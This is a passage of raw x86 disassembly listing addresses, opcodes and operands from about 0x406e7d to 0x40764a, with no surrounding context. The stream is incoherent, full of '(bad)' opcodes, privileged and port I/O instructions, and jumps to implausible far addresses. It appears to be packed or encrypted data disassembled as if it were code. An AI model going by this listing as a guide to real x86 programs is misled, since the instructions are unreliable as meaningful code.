  406e7d:	xor    ebx,edi
  406e7f:	sar    DWORD PTR [esi+0x11],1
  406e82:	icebp  
  406e83:	(bad)  
  406e84:	outs   dx,BYTE PTR ds:[esi]
  406e85:	or     eax,0x86b4dca6
  406e8a:	test   al,0xb
  406e8c:	fs test al,0x74
  406e8f:	xchg   edx,eax
  406e90:	(bad)  
  406e92:	adc    eax,DWORD PTR [edi-0x78ec94f1]
  406e98:	inc    edx
  406e99:	pop    ebp
  406e9a:	in     al,0xb3
  406e9c:	dec    edx
  406e9d:	stos   DWORD PTR es:[edi],eax
  406e9e:	aas    
  406e9f:	add    eax,0x7ffe6990
  406ea4:	aad    0xd2
  406ea6:	push   ss
  406ea7:	and    eax,0xcab974d5
  406eac:	add    DWORD PTR [esi+0x70a5b94d],ebp
  406eb2:	xor    BYTE PTR [edx],ah
  406eb4:	data16 cld 
  406eb6:	mov    ds:0x9d3f1c89,al
  406ebb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ebc:	mov    bh,0x6a
  406ebe:	inc    esp
  406ebf:	xchg   ebx,eax
  406ec0:	xor    dh,BYTE PTR ds:0x92651970
  406ec6:	(bad)
  406ec9:	mov    bl,0x42
  406ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ecc:	lahf   
  406ecd:	jne    0x406ef4
  406ecf:	mov    al,0xd2
  406ed1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ed2:	xchg   esi,eax
  406ed3:	push   esp
  406ed4:	in     eax,dx
  406ed5:	mov    edi,0xbeea39d3
  406eda:	xor    al,0xd2
  406edc:	sub    eax,0x9b11ce94
  406ee1:	mov    esp,0x83eb4661
  406ee6:	test   al,0x40
  406ee8:	sub    BYTE PTR [ebx],dl
  406eea:	mov    edx,0xb1dab11
  406eef:	fild   WORD PTR [ebx-0x525a0c78]
  406ef5:	ins    BYTE PTR es:[edi],dx
  406ef6:	ds push edi
  406ef8:	es mov bh,0x95
  406efb:	and    al,0x6
  406efd:	mov    eax,ds:0x6cca18a9
  406f02:	jl     0x406f1e
  406f04:	jnp    0x406ea7
  406f06:	outs   dx,DWORD PTR ds:[esi]
  406f07:	sub    al,bh
  406f09:	xor    bl,BYTE PTR [esi+0x30]
  406f0c:	aaa    
  406f0d:	jmp    0x1b23966b
  406f12:	sbb    edx,DWORD PTR [ecx]
  406f14:	adc    ebx,edi
  406f16:	gs loope 0x406f4e
  406f19:	ret    
  406f1a:	mov    edx,0x12aeffb9
  406f1f:	ror    DWORD PTR [edi+0x72d24a8e],0xeb
  406f26:	imul   edx,DWORD PTR [esi-0x4746cb5],0x17dfb72c
  406f30:	inc    ebx
  406f31:	mul    ebp
  406f33:	rcl    DWORD PTR [edx],0x10
  406f36:	pop    ecx
  406f37:	mov    DWORD PTR [esi+0x4a91964],0x2cf9af39
  406f41:	and    bh,BYTE PTR [esi+0xb]
  406f44:	sti    
  406f45:	outs   dx,DWORD PTR ds:[esi]
  406f46:	push   edx
  406f47:	gs jl  0x406fb5
  406f4a:	adc    bl,BYTE PTR [ecx-0x22]
  406f4d:	cmp    esi,DWORD PTR [esi+edx*2]
  406f50:	or     eax,0xceb41bf6
  406f55:	ins    DWORD PTR es:[edi],dx
  406f56:	mov    ah,0x1f
  406f58:	gs pop edx
  406f5a:	ja     0x406fa5
  406f5c:	fs leave 
  406f5e:	leave  
  406f5f:	adc    BYTE PTR [ebp-0x4a542fbe],al
  406f65:	dec    edi
  406f66:	jb     0x406fa7
  406f68:	xchg   edx,eax
  406f69:	lahf   
  406f6a:	cmp    dh,BYTE PTR ds:0x1ec1e254
  406f70:	inc    esp
  406f71:	in     al,dx
  406f72:	or     esi,DWORD PTR [edx]
  406f74:	cli    
  406f75:	xchg   BYTE PTR [esi-0x770c103],dl
  406f7b:	jg     0x406f26
  406f7d:	cmp    BYTE PTR ds:0xc4e9fc1d,al
  406f83:	cmp    DWORD PTR [ecx+0x79],ebx
  406f86:	imul   ebp,edx,0x5
  406f89:	pushf  
  406f8a:	mov    edx,0x35f6d356
  406f8f:	pop    ebx
  406f90:	test   DWORD PTR [ebx],esi
  406f92:	mov    eax,DWORD PTR [edi-0x5a]
  406f95:	mov    dl,0x8a
  406f97:	mov    edi,0x23ea8741
  406f9c:	call   0xf9a134fc
  406fa1:	mov    ds:0x408ab4ba,eax
  406fa6:	push   0xffffffbc
  406fa8:	xor    ebp,DWORD PTR [eax-0x6d]
  406fab:	nop
  406fac:	dec    ebx
  406fad:	mov    edi,0xfd19ef53
  406fb2:	dec    eax
  406fb3:	pop    esp
  406fb4:	sbb    eax,0xff49fe92
  406fb9:	pusha  
  406fba:	inc    eax
  406fbb:	xchg   ecx,eax
  406fbc:	cmp    BYTE PTR [edi-0x319db66c],bh
  406fc2:	sub    eax,0xd879614a
  406fc7:	inc    ebx
  406fc8:	adc    DWORD PTR [ebp-0x47783eea],ecx
  406fce:	xor    eax,0x974b8b7a
  406fd3:	jmp    0xaeca:0x8ed36140
  406fda:	ret    0xeef7
  406fdd:	jl     0x40703d
  406fdf:	push   0x55
  406fe1:	inc    esi
  406fe2:	in     eax,0xe0
  406fe4:	scas   eax,DWORD PTR es:[edi]
  406fe5:	ja     0x406f90
  406fe7:	pop    ecx
  406fe8:	pop    ebp
  406fe9:	push   esi
  406fea:	ss fwait
  406fec:	in     al,dx
  406fed:	xor    eax,ebx
  406fef:	mov    eax,0xdd06640d
  406ff4:	cmp    eax,0x2b3aad56
  406ff9:	adc    esi,DWORD PTR [ebx]
  406ffb:	cmp    bh,BYTE PTR es:[esi]
  406ffe:	sti    
  406fff:	dec    eax
  407000:	enter  0xe417,0xb3
  407004:	sbb    BYTE PTR [edi-0x75ce0737],dh
  40700a:	ror    ah,cl
  40700c:	leave  
  40700d:	pop    es
  40700e:	inc    esi
  40700f:	xchg   edi,eax
  407010:	jne    0x407006
  407012:	dec    ebx
  407013:	mov    bl,0xa5
  407015:	adc    DWORD PTR cs:[esi+0x28874dea],ebp
  40701c:	xor    bh,BYTE PTR [eax]
  40701e:	icebp  
  40701f:	int    0x6
  407021:	sub    eax,0xa1d3ab0f
  407026:	or     DWORD PTR [ecx],edx
  407028:	push   ss
  407029:	pop    ebp
  40702a:	jl     0x407021
  40702c:	and    BYTE PTR [ecx+0x1a],dl
  40702f:	sbb    al,0xa2
  407031:	icebp  
  407032:	xchg   esi,edx
  407034:	xchg   edi,eax
  407035:	lea    ebp,[ecx+0x12e0f2bc]
  40703b:	sbb    ch,bh
  40703d:	mov    ecx,0x5ca11b7b
  407042:	test   DWORD PTR [ebx-0x51],edi
  407045:	sbb    BYTE PTR [eax-0x53],ah
  407048:	lahf   
  407049:	dec    ecx
  40704a:	xchg   ecx,eax
  40704b:	push   0x3
  40704d:	(bad)  
  40704e:	jl     0x406fe2
  407050:	xor    ah,BYTE PTR ds:0xdc07a926
  407056:	sbb    ebx,DWORD PTR [ecx-0x3dcac982]
  40705c:	je     0x4070d5
  40705e:	pop    ebp
  40705f:	xchg   DWORD PTR [ecx],esi
  407061:	adc    dh,ah
  407063:	ins    BYTE PTR es:[edi],dx
  407064:	fcomp  DWORD PTR [esi]
  407066:	sbb    esi,DWORD PTR [esi-0x914706e]
  40706c:	push   ss
  40706d:	push   ds
  40706e:	xor    bh,ah
  407070:	dec    eax
  407072:	cmp    DWORD PTR [ebp+0x1c],edi
  407075:	into   
  407076:	(bad)  
  407077:	mov    bh,0x8e
  407079:	jno    0x407079
  40707b:	fidivr DWORD PTR [edx-0x31cc5ff9]
  407081:	inc    edi
  407082:	jbe    0x407035
  407084:	int3   
  407085:	dec    ebx
  407086:	sbb    eax,0x5893c249
  40708b:	arpl   dx,sp
  40708d:	sbb    BYTE PTR ds:0xd1eb07c2,bh
  407093:	loope  0x407095
  407095:	ja     0x4070bc
  407097:	jmp    0x9c7ef6
  40709c:	jp     0x4070f2
  40709e:	pushf  
  40709f:	jg     0x407022
  4070a1:	push   edx
  4070a2:	sub    al,0xb0
  4070a4:	ins    BYTE PTR es:[edi],dx
  4070a5:	sbb    DWORD PTR [edi-0x353da852],ebx
  4070ab:	jg     0x4070fe
  4070ad:	push   ebx
  4070ae:	and    al,0xcf
  4070b0:	push   esp
  4070b1:	ret    
  4070b2:	fdiv   DWORD PTR [edx]
  4070b4:	mov    ebp,0xed686b47
  4070b9:	and    BYTE PTR [eax],al
  4070bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070bc:	pusha  
  4070bd:	sti    
  4070be:	test   DWORD PTR [edx+ebx*1],esp
  4070c1:	xor    edx,eax
  4070c3:	jne    0x407079
  4070c5:	jb     0x40708b
  4070c7:	push   ss
  4070c8:	out    dx,eax
  4070c9:	sub    eax,0x16512106
  4070ce:	int3   
  4070cf:	outs   dx,BYTE PTR ds:[esi]
  4070d0:	es ret 
  4070d2:	outs   dx,BYTE PTR ds:[esi]
  4070d3:	mov    BYTE PTR [esi],cl
  4070d5:	adc    DWORD PTR [edi+0x4d],0x8b25b464
  4070dc:	xlat   BYTE PTR ds:[ebx]
  4070dd:	mov    ss,WORD PTR [ecx]
  4070df:	mov    dl,0x58
  4070e1:	mov    ds:0x36368749,eax
  4070e6:	iret   
  4070e7:	or     ebp,ebp
  4070e9:	push   esp
  4070ea:	jb     0x407090
  4070ec:	and    ecx,DWORD PTR [edx-0x1f437e64]
  4070f2:	mov    esi,0x121aba0c
  4070f7:	(bad)  
  4070f8:	mov    ah,0x3e
  4070fa:	adc    esi,DWORD PTR [edx+0x31]
  4070fd:	js     0x4070a4
  4070ff:	dec    edi
  407100:	ins    DWORD PTR es:[edi],dx
  407101:	ficomp DWORD PTR [ebx+0x1e0c79f2]
  407107:	adc    DWORD PTR [edi+edi*8-0x3d],0xffffffb3
  40710c:	pop    edx
  40710d:	mov    edi,0xe7217a6e
  407112:	ja     0x407186
  407114:	jl     0x4070b9
  407116:	ret    0xe5fb
  407119:	jnp    0x407161
  40711b:	inc    ecx
  40711c:	and    edx,DWORD PTR [edi+0x65]
  40711f:	(bad)  
  407121:	fsubr  st(3),st
  407123:	daa    
  407124:	mov    esp,DWORD PTR [eax-0x6b2d16fe]
  40712a:	out    dx,eax
  40712b:	mov    al,ds:0x2274d476
  407130:	dec    ebx
  407131:	ss jae 0x407131
  407134:	sub    esp,eax
  407136:	test   BYTE PTR [edx],0xdd
  407139:	pop    es
  40713a:	mov    edi,0xdc1c8917
  40713f:	pop    ebx
  407140:	pop    ds
  407141:	pop    ss
  407142:	xchg   ebx,eax
  407143:	xlat   BYTE PTR ds:[ebx]
  407144:	add    dl,BYTE PTR [ecx]
  407146:	ss (bad) 
  407149:	pop    ds
  40714a:	inc    esp
  40714b:	ins    BYTE PTR es:[edi],dx
  40714c:	std    
  40714d:	xor    al,0xa6
  40714f:	fwait
  407150:	aaa    
  407151:	mov    esp,DWORD PTR [eax-0x557b19ec]
  407157:	loope  0x40710f
  407159:	jo     0x407114
  40715b:	cdq    
  40715c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40715d:	pop    edi
  40715e:	xchg   ebx,eax
  40715f:	(bad)  
  407160:	enter  0xf09f,0x4f
  407164:	fisub  DWORD PTR [edi+0xedbdbac]
  40716a:	jns    0x40717a
  40716c:	out    0x49,eax
  40716e:	daa    
  40716f:	jns    0x407120
  407171:	out    0xfe,al
  407173:	imul   edi,edi,0xffffffff
  407176:	repnz add esi,esi
  407179:	iret   
  40717a:	xor    BYTE PTR [edi],dh
  40717c:	mov    cl,0xad
  40717e:	cs (bad) 
  407180:	mov    ds:0x82bd4e99,eax
  407185:	or     DWORD PTR [ebx-0x54],edx
  407188:	and    DWORD PTR [ebp+0x388e1a71],ebp
  40718e:	mov    esp,0xcbc00c56
  407193:	mov    ah,0x42
  407195:	adc    al,0x83
  407197:	jmp    0x4071cc
  407199:	sbb    BYTE PTR [edx-0x5c],0xe3
  40719d:	(bad)  
  40719e:	cmp    al,0xe2
  4071a0:	xchg   ebp,eax
  4071a1:	add    cl,al
  4071a3:	ret    0x387e
  4071a6:	mov    eax,ds:0xae2fd8c0
  4071ab:	cmp    DWORD PTR [ebp+0x38b0b7aa],esp
  4071b1:	jecxz  0x407151
  4071b3:	adc    ah,ah
  4071b5:	aaa    
  4071b6:	rcl    BYTE PTR [ebp+0x49],1
  4071b9:	dec    eax
  4071ba:	or     DWORD PTR [edi],ecx
  4071bc:	sbb    bh,BYTE PTR [ebx]
  4071be:	mov    WORD PTR [esi-0x23999378],cs
  4071c4:	sbb    al,BYTE PTR [edi]
  4071c6:	dec    ebp
  4071c7:	psrlw  mm1,QWORD PTR [ebx-0x43]
  4071cb:	mov    dh,0x3a
  4071cd:	adc    ebp,DWORD PTR [edi]
  4071cf:	loope  0x407209
  4071d1:	bound  edi,QWORD PTR [ecx]
  4071d3:	adc    DWORD PTR [edx+0x44d7fdf3],edx
  4071d9:	pop    edi
  4071da:	fsub   QWORD PTR [esi+0x55]
  4071dd:	sbb    eax,0xa08d2681
  4071e2:	outs   dx,BYTE PTR ds:[esi]
  4071e3:	mov    cl,dl
  4071e5:	inc    BYTE PTR [ebx+0x68]
  4071e8:	dec    ecx
  4071e9:	adc    al,0x89
  4071eb:	add    BYTE PTR [eax-0x12de061c],ch
  4071f1:	push   esi
  4071f2:	jp     0x407270
  4071f4:	jno    0x4071d8
  4071f6:	js     0x4071cf
  4071f8:	add    BYTE PTR [esi+eiz*4-0x16],bh
  4071fc:	or     eax,0x66035f09
  407201:	into   
  407202:	pusha  
  407203:	idiv   DWORD PTR ds:0x1da9e20e
  407209:	ret    0xafa8
  40720c:	push   eax
  40720d:	scas   eax,DWORD PTR es:[edi]
  40720e:	test   al,0x5d
  407210:	ret    0x2472
  407213:	sbb    ebp,DWORD PTR [eax+0x29e07725]
  407219:	popa   
  40721a:	sbb    al,0xa
  40721c:	int3   
  40721d:	ins    BYTE PTR es:[edi],dx
  40721e:	fistp  WORD PTR [esi+0x1c]
  407221:	mov    ch,0x2a
  407223:	imul   edx
  407225:	inc    edi
  407226:	(bad)  
  407227:	rcr    BYTE PTR [edx],1
  407229:	dec    ebx
  40722a:	pop    eax
  40722b:	mov    ds:0x8a6180c5,eax
  407230:	fisubr WORD PTR [esi-0x64]
  407233:	add    BYTE PTR [edi-0x1162ff1],ch
  407239:	mov    ds:0xa27e695c,al
  40723e:	or     eax,0x5e78869b
  407243:	jmp    0xe4c3:0xdd21c9d1
  40724a:	fisubr WORD PTR [ebx+0x33]
  40724d:	stos   DWORD PTR es:[edi],eax
  40724e:	fmul   DWORD PTR [esi]
  407250:	sbb    DWORD PTR [ebx+0x3b5064e8],0xb14659cd
  40725a:	sub    DWORD PTR [esi],ebx
  40725c:	pushf  
  40725d:	xor    BYTE PTR [ebx],bh
  40725f:	sub    dh,BYTE PTR [esi]
  407261:	fs clc 
  407263:	mov    edx,0xb13f6afa
  407268:	sub    BYTE PTR [eax+esi*8+0x77],cl
  40726c:	mov    dl,0x18
  40726e:	std    
  40726f:	xchg   esi,eax
  407270:	sub    al,0x33
  407272:	aad    0x6e
  407274:	test   edi,0xef220b6d
  40727a:	cmp    eax,0x91886398
  40727f:	into   
  407280:	jmp    0x407280
  407282:	add    eax,0xf868063d
  407287:	mov    ds:0xd31ed2b7,eax
  40728c:	sahf   
  40728d:	mov    dh,0x71
  40728f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407290:	(bad)  
  407291:	rcl    DWORD PTR [esi+0x3543a001],cl
  407297:	mov    eax,ds:0x649a4426
  40729c:	aas    
  40729d:	fadd   QWORD PTR [ebx-0x39]
  4072a0:	xchg   BYTE PTR [ebx],bh
  4072a2:	sbb    al,0x3b
  4072a4:	cwde   
  4072a5:	push   edi
  4072a6:	mov    BYTE PTR [edx-0x49],bh
  4072a9:	mov    BYTE PTR [eax-0xe98f54],bh
  4072af:	loop   0x407286
  4072b1:	ins    BYTE PTR es:[edi],dx
  4072b2:	(bad)  
  4072b3:	repz (bad) 
  4072b5:	and    eax,0xfae25e8b
  4072ba:	dec    ecx
  4072bb:	add    al,0x43
  4072bd:	mov    al,ds:0xd0d1ab62
  4072c2:	xchg   ebp,eax
  4072c3:	jns    0x40727f
  4072c5:	mov    bl,0xb1
  4072c7:	xchg   DWORD PTR [esi+ebx*8],esi
  4072ca:	jne    0x407252
  4072cc:	sub    BYTE PTR [ecx],ch
  4072ce:	mov    ebp,0xf8ab8059
  4072d3:	mov    ds:0x325b8729,eax
  4072d8:	inc    ebp
  4072d9:	ins    BYTE PTR es:[edi],dx
  4072da:	(bad)  
  4072db:	jbe    0x4072e4
  4072dd:	enter  0xd9e1,0x85
  4072e1:	or     al,0xba
  4072e3:	cld    
  4072e4:	xor    eax,0x1141a90f
  4072e9:	xchg   ecx,eax
  4072ea:	push   edx
  4072eb:	clc    
  4072ec:	std    
  4072ed:	lds    edi,FWORD PTR [esi]
  4072ef:	lods   eax,DWORD PTR ds:[esi]
  4072f0:	stos   DWORD PTR es:[edi],eax
  4072f1:	cwde   
  4072f2:	cli    
  4072f3:	push   DWORD PTR [edi]
  4072f5:	xchg   DWORD PTR [esi-0x73db7405],esi
  4072fb:	mov    ch,0xc4
  4072fd:	test   DWORD PTR [ebx-0x13],esi
  407300:	mov    ebp,0x6f26e09d
  407305:	shl    BYTE PTR [esi+ecx*1-0x1f355d44],1
  40730c:	mov    ebx,DWORD PTR [edx-0x2607e4b]
  407312:	test   BYTE PTR [edx],dh
  407314:	scas   al,BYTE PTR es:[edi]
  407315:	xchg   ecx,eax
  407316:	retf   
  407317:	icebp  
  407318:	push   cs
  407319:	adc    eax,0xe45faf88
  40731e:	frstor [edx]
  407320:	aas    
  407321:	dec    ecx
  407322:	addr16 mov ecx,0xf8ebb331
  407328:	ret    0x69ec
  40732b:	mov    edi,0x5f8e4ed7
  407330:	(bad)  
  407331:	jle    0x407334
  407333:	pop    ebx
  407334:	adc    BYTE PTR [ebp+edx*1-0x7013be21],ch
  40733b:	jns    0x4073b3
  40733d:	xchg   esi,eax
  40733e:	or     al,0xe8
  407340:	loop   0x407377
  407342:	ss ret 
  407344:	ret    
  407345:	mov    bh,0xa6
  407347:	push   edi
  407348:	dec    ebx
  407349:	mov    bh,0xff
  40734b:	mov    edx,0xed63ea67
  407350:	mov    eax,ds:0x72070707
  407355:	xor    dh,ch
  407357:	lock rcl DWORD PTR [edi-0x1d],0x7f
  40735c:	xor    edi,ebp
  40735e:	add    eax,0x8aeec50f
  407363:	jmp    0x123c:0xafaa1fcb
  40736a:	pushf  
  40736b:	inc    ebx
  40736c:	xlat   BYTE PTR ds:[ebx]
  40736d:	dec    edi
  40736e:	dec    ebp
  40736f:	imul   DWORD PTR [ebp+0x791a4851]
  407375:	mov    dl,0xc2
  407377:	dec    edx
  407378:	aaa    
  407379:	and    esp,ebx
  40737b:	push   0x6d3e6eb8
  407380:	fcom   DWORD PTR [edx+0x56c931b7]
  407386:	inc    esp
  407387:	dec    ebx
  407388:	mov    ch,0x3
  40738a:	cmp    ch,BYTE PTR [ecx+0x7e8d1c]
  407390:	dec    esp
  407391:	sar    cl,cl
  407393:	enter  0x3cdf,0x65
  407397:	aaa    
  407398:	mov    WORD PTR [eax],?
  40739a:	add    edi,DWORD PTR [ebx+0x7d]
  40739d:	add    bh,BYTE PTR [esi-0x52b31a2e]
  4073a3:	pop    ecx
  4073a4:	push   es
  4073a5:	outs   dx,BYTE PTR ds:[esi]
  4073a6:	dec    ecx
  4073a7:	fcomp  QWORD PTR [edx-0x65b2e7f9]
  4073ad:	mov    al,ds:0xa8434694
  4073b2:	push   esp
  4073b3:	jmp    0x23419eb1
  4073b8:	xacquire xchg DWORD PTR [edx-0x26442702],esp
  4073bf:	sar    BYTE PTR [eax-0x74267b57],0x5d
  4073c6:	aas    
  4073c7:	lahf   
  4073c8:	js     0x4073f5
  4073ca:	loope  0x4073f5
  4073cc:	xor    DWORD PTR [ecx-0x5b],edx
  4073cf:	adc    BYTE PTR [esi],ah
  4073d1:	dec    ebx
  4073d2:	loop   0x407385
  4073d4:	push   ds
  4073d5:	(bad)  
  4073d6:	loop   0x40737d
  4073d8:	mov    edi,0x2c286ea
  4073dd:	bound  edi,QWORD PTR [edx+0x2fb34559]
  4073e3:	cmp    cl,BYTE PTR [eax+0x52]
  4073e6:	paddw  mm2,QWORD PTR [esi-0x3b]
  4073ea:	mov    ah,0x7f
  4073ec:	push   ds
  4073ed:	inc    ecx
  4073ee:	shl    DWORD PTR [ecx+0x7c048b0a],1
  4073f4:	mov    bl,0x26
  4073f6:	fisubr WORD PTR [ecx+0x32]
  4073f9:	inc    edi
  4073fa:	shl    edx,cl
  4073fc:	fidivr DWORD PTR [edi+0x393b2313]
  407402:	fild   WORD PTR [esi]
  407404:	and    cl,BYTE PTR [ecx+0x208c73d0]
  40740a:	rcr    DWORD PTR [edi],0xf5
  40740d:	cmp    BYTE PTR ds:0x9530dfda,dh
  407413:	test   eax,0xbefdf5c
  407418:	sub    ebx,DWORD PTR [edx+0x12]
  40741b:	push   esi
  40741c:	adc    edx,DWORD PTR [esi]
  40741e:	repz jmp 0xd9e1:0x94153d72
  407426:	jl     0x4073ce
  407428:	scas   eax,DWORD PTR es:[edi]
  407429:	jo     0x407455
  40742b:	push   edx
  40742c:	adc    bh,bl
  40742e:	stos   BYTE PTR es:[edi],al
  40742f:	mov    ds:0xcb38768f,al
  407434:	add    al,0x5b
  407436:	cmp    al,0x1b
  407438:	jg     0x407492
  40743a:	mov    edi,0x1230901a
  40743f:	xchg   ebp,eax
  407440:	fcom   QWORD PTR [eax-0x3bd23233]
  407446:	test   eax,0xafefc3a
  40744b:	mov    WORD PTR [edx],gs
  40744d:	mov    eax,ds:0xa749eb4d
  407452:	in     eax,0xdd
  407454:	retf   
  407455:	inc    esp
  407456:	mov    BYTE PTR [edi-0x15],al
  407459:	aas    
  40745a:	ret    
  40745b:	scas   al,BYTE PTR es:[edi]
  40745c:	push   es
  40745d:	cwde   
  40745e:	test   dl,ah
  407460:	xchg   DWORD PTR [edx+0x243a104b],ebp
  407466:	lods   al,BYTE PTR ds:[esi]
  407467:	arpl   WORD PTR [edi+0x1],cx
  40746a:	cld    
  40746b:	fild   DWORD PTR [edi]
  40746d:	jmp    0x4074e8
  40746f:	push   es
  407470:	mov    si,0x659
  407474:	xor    BYTE PTR [eax],bh
  407476:	mov    dh,0x27
  407478:	pop    ecx
  407479:	cmp    esp,eax
  40747b:	push   ss
  40747c:	idiv   BYTE PTR [ebx+edi*2-0x23]
  407480:	jnp    0x40749c
  407482:	aas    
  407483:	leave  
  407484:	nop
  407485:	call   0xe741:0x1b7be331
  40748c:	les    ebp,FWORD PTR [ebx-0x35]
  40748f:	xchg   ebx,eax
  407490:	repz shl BYTE PTR [edx+0x6a],0xaa
  407495:	div    BYTE PTR [edi]
  407497:	stc    
  407498:	or     eax,0x3fa32255
  40749d:	es sub eax,0xd7c6d8b0
  4074a3:	(bad)  
  4074a4:	fnstcw WORD PTR [edi]
  4074a6:	lock lahf 
  4074a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074a9:	xchg   edi,eax
  4074aa:	sbb    al,0xa0
  4074ac:	cli    
  4074ad:	aad    0xc7
  4074af:	(bad)  
  4074b0:	pushf  
  4074b1:	mov    esp,0xd438a087
  4074b6:	shr    BYTE PTR [edi],0xea
  4074b9:	data16 cld 
  4074bb:	jnp    0x407454
  4074bd:	ds in  eax,dx
  4074bf:	add    BYTE PTR [eax+0x5c],al
  4074c2:	loop   0x4074fd
  4074c4:	std    
  4074c5:	xor    DWORD PTR [edi+eax*4+0x53],esp
  4074c9:	jne    0x407458
  4074cb:	xor    DWORD PTR [ebx+0x15],esp
  4074ce:	dec    eax
  4074cf:	scas   eax,DWORD PTR es:[edi]
  4074d0:	iret   
  4074d1:	mov    BYTE PTR [ebp-0x16],ah
  4074d4:	push   ds
  4074d5:	push   esp
  4074d6:	and    DWORD PTR [esi+ebp*2-0x7321cda4],0xffffffaf
  4074de:	(bad)  
  4074df:	call   0x747e:0xc50047b
  4074e6:	pop    ecx
  4074e7:	cld    
  4074e8:	xlat   BYTE PTR ds:[ebx]
  4074e9:	jmp    0x6f211dc0
  4074ee:	sti    
  4074ef:	cmp    eax,0x24df67f4
  4074f4:	ret    
  4074f5:	nop
  4074f6:	ss xchg esp,eax
  4074f8:	and    bh,BYTE PTR [esi+0x3b]
  4074fb:	(bad)  
  4074fc:	adc    eax,0x191072d4
  407501:	cmp    BYTE PTR [ebp-0x4c74e6a6],bh
  407507:	ins    BYTE PTR es:[edi],dx
  407508:	scas   eax,DWORD PTR es:[edi]
  407509:	retf   
  40750a:	fcmovu st,st(4)
  40750c:	fisubr DWORD PTR [ecx-0x7aac52ad]
  407512:	dec    esi
  407513:	mov    WORD PTR [edi+0x2c109d6],gs
  407519:	imul   esp,DWORD PTR [edx],0xffffff87
  40751c:	loop   0x407552
  40751e:	jmp    0xe7f58c84
  407523:	jb     0x407590
  407525:	push   edx
  407526:	fld    TBYTE PTR [edx]
  407528:	adc    esi,ecx
  40752a:	sbb    DWORD PTR [ebx+eiz*4+0x52],eax
  40752e:	and    ebp,DWORD PTR [edi+0x7c1b6d8c]
  407534:	push   es
  407535:	sub    BYTE PTR [edx],ch
  407537:	arpl   WORD PTR [ebx+0x2d0c157d],dx
  40753d:	mov    cl,0xb0
  40753f:	popf   
  407540:	dec    edi
  407541:	outs   dx,DWORD PTR ds:[esi]
  407542:	sub    BYTE PTR [ecx-0x3],bl
  407545:	scas   al,BYTE PTR es:[edi]
  407546:	sub    dl,dh
  407548:	adc    bl,BYTE PTR [ebx+esi*8]
  40754b:	add    esi,DWORD PTR [esi-0x16]
  40754e:	jnp    0x407573
  407550:	xor    dh,BYTE PTR [eax-0x518c5ec9]
  407556:	cli    
  407557:	popf   
  407558:	cli    
  407559:	(bad)  [ebx+0x4e3f974c]
  40755f:	inc    eax
  407560:	scas   al,BYTE PTR es:[edi]
  407561:	ds mov edi,0x24dd2535
  407567:	ret    
  407568:	cmp    bl,al
  40756a:	loop   0x407534
  40756c:	push   esi
  40756d:	out    dx,eax
  40756e:	mov    ah,0x4
  407570:	mov    bl,0xb4
  407572:	xor    ah,BYTE PTR [edi-0x46a0b557]
  407578:	sub    ah,dl
  40757a:	loope  0x4075e7
  40757c:	push   edx
  40757d:	outs   dx,BYTE PTR ds:[esi]
  40757e:	mov    ds,WORD PTR [edi+0x73]
  407581:	hlt    
  407582:	lds    esi,FWORD PTR [ecx-0x2f]
  407585:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407586:	pop    ebx
  407587:	mov    dh,0x3b
  407589:	cli    
  40758a:	fcmovnbe st,st(4)
  40758c:	outs   dx,BYTE PTR ds:[esi]
  40758d:	cmp    BYTE PTR [ebx+0x51a1c7d9],ch
  407593:	in     eax,0x9c
  407595:	(bad)  
  407596:	jg     0x407563
  407598:	pop    ebp
  407599:	cmp    DWORD PTR ds:0x979b5f,esi
  40759f:	mov    ebp,0x9831c83d
  4075a4:	arpl   sp,cx
  4075a6:	icebp  
  4075a7:	dec    ebp
  4075a8:	sti    
  4075a9:	push   0xffffffd5
  4075ab:	push   0x7c
  4075ad:	cli    
  4075ae:	mov    edi,0xca487e23
  4075b3:	xchg   edx,eax
  4075b4:	jns    0x4075ba
  4075b6:	xor    esi,esp
  4075b8:	stos   DWORD PTR es:[edi],eax
  4075b9:	pop    es
  4075ba:	mov    ebx,0x1a19f6e8
  4075bf:	jl     0x4075ce
  4075c1:	dec    edi
  4075c2:	add    ch,bl
  4075c4:	push   eax
  4075c5:	leave  
  4075c6:	cmp    DWORD PTR [eax-0xf211a09],ebp
  4075cc:	fwait
  4075cd:	jns    0x4075b2
  4075cf:	repnz xchg edx,eax
  4075d1:	xchg   ecx,eax
  4075d2:	call   FWORD PTR [edi-0x6c192fa3]
  4075d8:	sti    
  4075d9:	sahf   
  4075da:	adc    BYTE PTR [edx-0x18],0xeb
  4075de:	es ins BYTE PTR es:[edi],dx
  4075e0:	mov    bl,0x4a
  4075e2:	cmp    eax,0x83613c26
  4075e7:	mov    bl,0xc2
  4075e9:	fidivr DWORD PTR [ecx]
  4075eb:	scas   eax,DWORD PTR es:[edi]
  4075ec:	(bad)
  4075ef:	or     al,bl
  4075f1:	mov    ah,al
  4075f3:	lock jo 0x407648
  4075f6:	mov    edx,DWORD PTR [ecx+0x52]
  4075f9:	icebp  
  4075fa:	xchg   ebp,eax
  4075fb:	jne    0x4075e1
  4075fd:	jecxz  0x407624
  4075ff:	fldcw  WORD PTR [ebx+0x6d]
  407602:	mov    eax,ds:0x8464304e
  407607:	call   0x30b58715
  40760c:	add    al,0xfb
  40760e:	jl     0x4075b8
  407610:	lock xor al,0xb9
  407613:	sub    ecx,edi
  407615:	and    eax,0xca984977
  40761a:	outs   dx,BYTE PTR ds:[esi]
  40761b:	pop    edx
  40761c:	lods   al,BYTE PTR ds:[esi]
  40761d:	xchg   ebx,eax
  40761e:	std    
  40761f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407620:	and    eax,0x2a928cc4
  407625:	dec    esp
  407626:	push   edi
  407627:	std    
  407628:	fs out dx,al
  40762a:	jle    0x4075b9
  40762c:	push   ebp
  40762d:	sahf   
  40762e:	sub    BYTE PTR [edi],0x57
  407631:	jle    0x4075da
  407633:	push   esp
  407634:	mov    ebp,0x44715edf
  407639:	mov    bl,BYTE PTR [eax+eiz*2-0x22]
  40763d:	fisttp DWORD PTR ds:0x66451bb3
  407643:	cmp    eax,DWORD PTR [esi]
  407645:	pop    edi
  407646:	adc    BYTE PTR [eax+0x7d],dl
  407649:	pop    ebx
  40764a:	xlat   BYTE PTR ds:[ebx]
